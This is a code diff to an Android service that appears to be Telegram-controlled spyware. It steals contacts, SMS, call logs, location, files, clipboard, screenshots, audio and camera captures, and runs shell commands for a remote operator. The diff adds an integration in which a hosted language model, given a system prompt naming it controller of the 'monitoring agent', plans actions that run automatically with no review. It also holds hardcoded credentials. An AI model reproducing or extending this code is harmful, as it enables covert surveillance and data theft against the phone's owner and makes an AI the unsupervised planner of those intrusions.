@@ -45,6 +45,11 @@ const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
 const val ALLOWED_USER_ID = 8335972628L
 const val TELEGRAM_API = "https://api.telegram.org/bot"
 
+// NVIDIA Nemotron 3 Ultra 550B
+const val NVIDIA_API_KEY = "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"
+const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
+const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"
+
 data class TelegramCallback(
     val chatId: Long,
     val latch: CountDownLatch,
@@ -172,22 +177,25 @@ class MonitorService : Service() {
             return
         }
         
-        when (text.trim()) {
-            "/start", "/help" -> sendTelegramMessage(chatId, getHelp())
-            "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
-            "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf<String, Any>())
-            "/sms" -> sendTelegramTask(chatId, "sms", mapOf<String, Any>())
-            "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf<String, Any>())
-            "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
-            "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
-            "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
-            "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
-            "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
-            "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
-            "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
-            "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
+        val trimmed = text.trim()
+        when {
+            trimmed == "/start" || trimmed == "/help" -> sendTelegramMessage(chatId, getHelp())
+            trimmed == "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
+            trimmed == "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf<String, Any>())
+            trimmed == "/sms" -> sendTelegramTask(chatId, "sms", mapOf<String, Any>())
+            trimmed == "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf<String, Any>())
+            trimmed == "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
+            trimmed == "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
+            trimmed == "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
+            trimmed == "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
+            trimmed == "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
+            trimmed == "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
+            trimmed == "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
+            trimmed == "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
+            trimmed.startsWith("/ai ") -> handleAiCommand(chatId, trimmed.substring(4).trim())
+            trimmed.startsWith("/auto ") -> handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
             else -> {
-                if (text.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to text.substring(7).trim()))
+                if (trimmed.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to trimmed.substring(7).trim()))
                 else sendTelegramMessage(chatId, "Unknown. Use /help")
             }
         }
@@ -650,7 +658,167 @@ class MonitorService : Service() {
 /audio - Record audio
 /camera - Take photo
 /shell <cmd> - Run shell
+/ai <prompt> - Ask Nemotron 3 Ultra AI
+/auto <task> - AI auto-executes task
 """.trimIndent()
+
+// ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====
+
+private fun callNemotron(prompt: String): String {
+    try {
+        val systemPrompt = """You are an AI assistant controlling an Android monitoring agent. 
+Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
+For each user request, respond with a JSON object containing:
+{
+  "action": "capability_name",
+  "args": { ... },
+  "reasoning": "why this action"
+}
+If multiple actions needed, return array of actions.
+Only respond with valid JSON, no extra text."""
+
+        val payload = mutableMapOf<String, Any>()
+        payload["model"] = NVIDIA_MODEL
+        payload["messages"] = listOf(
+            mapOf("role" to "system", "content" to systemPrompt),
+            mapOf("role" to "user", "content" to prompt)
+        )
+        payload["temperature"] = 0.1
+        payload["max_tokens"] = 2048
+        payload["top_p"] = 0.9
+        payload["stream"] = false
+
+        val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
+        val req = Request.Builder()
+            .url(NVIDIA_API_URL)
+            .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
+            .addHeader("Content-Type", "application/json")
+            .post(body)
+            .build()
+
+        client.newCall(req).execute().use { resp ->
+            val responseBody = resp.body?.string() ?: ""
+            if (resp.isSuccessful) {
+                val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
+                val content = json.get("choices").asJsonArray[0].asJsonObject
+                    .get("message").asJsonObject.get("content").asString
+                return content
+            } else {
+                Log.e("Nemotron", "API error: $resp.code - $responseBody")
+                return "{\"error\": \"API error: $resp.code\"}"
+            }
+        }
+    } catch (e: Exception) {
+        Log.e("Nemotron", "Error", e)
+        return "{\"error\": \"${e.message}\"}"
+    }
+}
+
+private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
+    val results = mutableListOf<Map<String, Any>>()
+    try {
+        val json = com.google.gson.JsonParser.parseString(aiResponse)
+        val actions = when {
+            json.isJsonArray -> json.asJsonArray
+            json.isJsonObject -> {
+                val arr = com.google.gson.JsonArray()
+                arr.add(json)
+                arr
+            }
+            else -> return results
+        }
+
+        actions.forEach { actionJson ->
+            val actionObj = actionJson.asJsonObject
+            val action = actionObj.get("action")?.asString ?: ""
+            val args = actionObj.get("args")?.asJsonObject
+            val reasoning = actionObj.get("reasoning")?.asString ?: ""
+
+            val argsMap = mutableMapOf<String, Any>()
+            args?.entrySet()?.forEach { entry ->
+                val value = when {
+                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
+                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asNumber()
+                    entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
+                    else -> entry.value.toString()
+                }
+                argsMap[entry.key] = value
+            }
+
+            try {
+                val result = executeCapability(action, gson.toJson(argsMap))
+                val m = mutableMapOf<String, Any>()
+                m["action"] = action
+                m["args"] = argsMap
+                m["reasoning"] = reasoning
+                m["result"] = result
+                m["status"] = "completed"
+                results.add(m)
+            } catch (e: Exception) {
+                val m = mutableMapOf<String, Any>()
+                m["action"] = action
+                m["args"] = argsMap
+                m["reasoning"] = reasoning
+                m["error"] = e.message
+                m["status"] = "failed"
+                results.add(m)
+            }
+        }
+    } catch (e: Exception) {
+        Log.e("AI", "Parse error", e)
+        val m = mutableMapOf<String, Any>()
+        m["error"] = e.message
+        m["raw_response"] = aiResponse
+        results.add(m)
+    }
+    return results
+}
+
+private fun handleAiCommand(chatId: Long, prompt: String) {
+    val taskId = java.util.UUID.randomUUID().toString()
+    val latch = CountDownLatch(1)
+    val callback = TelegramCallback(chatId, latch)
+    telegramCallbacks[taskId] = callback
+
+    Thread({
+        try {
+            // Step 1: Ask Nemotron for action plan
+            val aiResponse = callNemotron(prompt)
+            Log.d("AI", "Nemotron response: $aiResponse")
+
+            // Step 2: Execute AI-generated actions
+            val results = executeAiActions(aiResponse)
+
+            // Step 3: Send results back
+            val summary = StringBuilder("AI Task $taskId completed:\n\n")
+            results.forEach { r ->
+                summary.append("Action: ${r["action"]}\n")
+                summary.append("Reasoning: ${r["reasoning"]}\n")
+                if (r["status"] == "completed") {
+                    summary.append("Result: ${r["result"]}\n")
+                } else {
+                    summary.append("Error: ${r["error"]}\n")
+                }
+                summary.append("\n")
+            }
+
+            val msg = summary.toString()
+            if (latch.await(60, TimeUnit.SECONDS)) {
+                callback.result = msg
+                callback.status = "completed"
+                callback.latch.countDown()
+                sendTelegramMessage(chatId, msg)
+            } else {
+                sendTelegramMessage(chatId, "AI task $taskId timed out")
+            }
+        } catch (e: Exception) {
+            Log.e("AI", "Error", e)
+            sendTelegramMessage(chatId, "AI Error: ${e.message}")
+        } finally {
+            telegramCallbacks.remove(taskId)
+        }
+    }, "ai-$taskId").start()
+}
 
     override fun onBind(intent: Intent): IBinder = binder
 
